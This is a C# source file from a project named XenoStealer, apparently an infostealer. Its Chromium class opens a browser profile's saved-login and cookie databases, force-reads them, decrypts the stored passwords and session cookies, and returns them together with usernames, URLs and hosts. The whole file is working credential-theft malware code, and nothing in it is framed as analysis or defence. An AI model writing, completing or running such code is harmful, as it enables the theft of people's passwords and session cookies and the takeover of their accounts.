using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace XenoStealer
{
    public static class Chromium
    {

        public static DataExtractionStructs.ChromiumLogin[] GetLogins(string profilePath, ChromeDecryptor decryptor) 
        {
            List<DataExtractionStructs.ChromiumLogin> logins = new List<DataExtractionStructs.ChromiumLogin>();

            string db_location = Path.Combine(profilePath, "Login Data");
            if (!File.Exists(db_location))
            {
                return null;
            }

            byte[] fileBytes = Utils.ForceReadFile(db_location);
            if (fileBytes == null)
            {
                return null;
            }

            SqlLite3Parser parser;
            try
            {
                parser = new SqlLite3Parser(fileBytes);
            }
            catch
            {
                return null;
            }

            if (!parser.ReadTable("logins"))
            {
                return null;
            }

            for (int i = 0; i < parser.GetRowCount(); i++)
            {
                string password = parser.GetValue(i, "password_value");
                string username = parser.GetValue(i, "username_value");
                string url = parser.GetValue(i, "action_url");
                if (string.IsNullOrEmpty(url))
                {
                    string TempUrl = parser.GetValue(i, "origin_url");
                    if (TempUrl != null) 
                    {
                        url = TempUrl;
                    }
                }
                if (password == null || username == null || url == null) continue;

                password = decryptor.Decrypt(password);

                if (string.IsNullOrEmpty(password))
                {
                    continue;
                }
                logins.Add(new DataExtractionStructs.ChromiumLogin(username, password, url));
            }

            return logins.ToArray();

        }
        public static DataExtractionStructs.ChromiumCookie[] GetCookies(string profilePath, ChromeDecryptor decryptor) 
        {
            List<DataExtractionStructs.ChromiumCookie> cookies = new List<DataExtractionStructs.ChromiumCookie>();

            string db_location = Path.Combine(profilePath, "Network", "Cookies");
            if (!File.Exists(db_location))
            {
                return null;
            }

            byte[] fileBytes = Utils.ForceReadFile(db_location);
            if (fileBytes == null)
            {
                return null;
            }

            SqlLite3Parser parser;
            try
            {
                parser = new SqlLite3Parser(fileBytes);
            }
            catch
            {
                return null;
            }

            if (!parser.ReadTable("cookies"))
            {
                return null;
            }

            for (int i = 0; i < parser.GetRowCount(); i++)
            {
                string host = parser.GetValue(i, "host_key");
                string name = parser.GetValue(i, "name");
                string url_path = parser.GetValue(i, "path");
                string encryptedCookie = parser.GetValue(i, "encrypted_value");
                string expiry_string = parser.GetValue(i, "expires_utc");
                bool secure = parser.GetValue(i, "is_secure") != "0";
                bool httpOnly = parser.GetValue(i, "is_httponly") != "0";

                bool gotExpiry = ulong.TryParse(expiry_string, out ulong expiry);

                if (host == null || name == null || url_path == null || encryptedCookie == null || !gotExpiry) continue;

                string decryptedCookie = decryptor.Decrypt(encryptedCookie);
                if (string.IsNullOrEmpty(decryptedCookie))
                {
                    continue;
                }
                cookies.Add(new DataExtractionStructs.ChromiumCookie(host, url_path, name, decryptedCookie, expiry, secure, httpOnly));
            }

            return cookies.ToArray();
        }

    }
}
